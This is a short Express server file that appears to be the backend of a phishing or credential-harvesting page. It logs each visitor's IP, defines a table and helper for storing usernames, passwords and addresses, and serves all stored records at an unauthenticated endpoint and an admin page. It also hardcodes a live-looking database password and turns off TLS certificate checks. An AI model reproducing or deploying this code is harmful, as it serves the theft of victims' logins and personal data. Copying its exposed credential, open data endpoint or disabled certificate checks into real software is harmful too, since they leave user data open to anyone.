const express = require('express');
const path = require('path');
const { Pool } = require('pg');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Supabase Connection
const pool = new Pool({
    connectionString: 'postgresql://postgres.bjyhgxqromtghuvnozog:ibnaira1999@@aws-0-eu-west-1.pooler.supabase.com:6543/postgres',
    ssl: { rejectUnauthorized: false }
});
pool.query(`CREATE TABLE IF NOT EXISTS records (
    id SERIAL PRIMARY KEY,
    type TEXT,
    username TEXT,
    password TEXT,
    address TEXT,
    ip TEXT,
    timestamp TEXT
)`);

function saveRecord(type, username = null, password = null, address = null, ip = 'Unknown') {
    const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' });
    pool.query(
        "INSERT INTO records (type, username, password, address, ip, timestamp) VALUES ($1, $2, $3, $4, $5, $6)",
        [type, username, password, address, ip, timestamp]
    );
    console.log(`📍 SAVED: ${type} | IP: ${ip}`);
}

// MAIN ROUTE - This must work
app.get('/', (req, res) => {
    const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
    saveRecord('Page Visit', null, null, null, ip);
    console.log("✅ Someone opened the main link!");
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/api/records', async (req, res) => {
    const result = await pool.query("SELECT * FROM records ORDER BY id DESC");
    res.json(result.rows);
});

app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Server running on Vercel`);
});